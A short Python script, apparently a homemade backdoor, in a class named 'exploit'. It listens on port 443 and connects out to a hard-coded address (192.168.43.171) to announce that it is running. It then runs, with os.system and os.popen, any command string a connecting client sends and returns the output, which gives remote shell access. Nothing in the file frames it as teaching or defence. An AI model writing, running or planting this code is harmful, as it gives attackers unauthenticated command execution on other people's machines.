import os
import sys
import socket
from threading import Thread


class exploit:
    def __init__(self):
        attack = ['192.168.43.171', 443]
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(('192.168.43.1', 443))
        self.server.listen()
        self.client.connect((str(attack[0]), 443))
        self.client.send('start'.encode('utf-8'))
        self.client.close()
        
        
    def hack(self, client_socket):
        oke = client_socket.recv(1024)
        eko = oke.decode('utf-8')
        try:
            os.system(str(eko))
            tosend = os.popen(str(eko)).read()
            client_socket.send(tosend.encode('utf-8'))
            client_socket.close()
        except:
            client_socket.send('error while running command'.encode('utf-8'))
            client_socket.close()
        
    def run(self):
        while True:
            client, addr = self.server.accept()
            torun = Thread(target=self.hack, args=[client,])
            torun.start()
            
            
exploit().run() 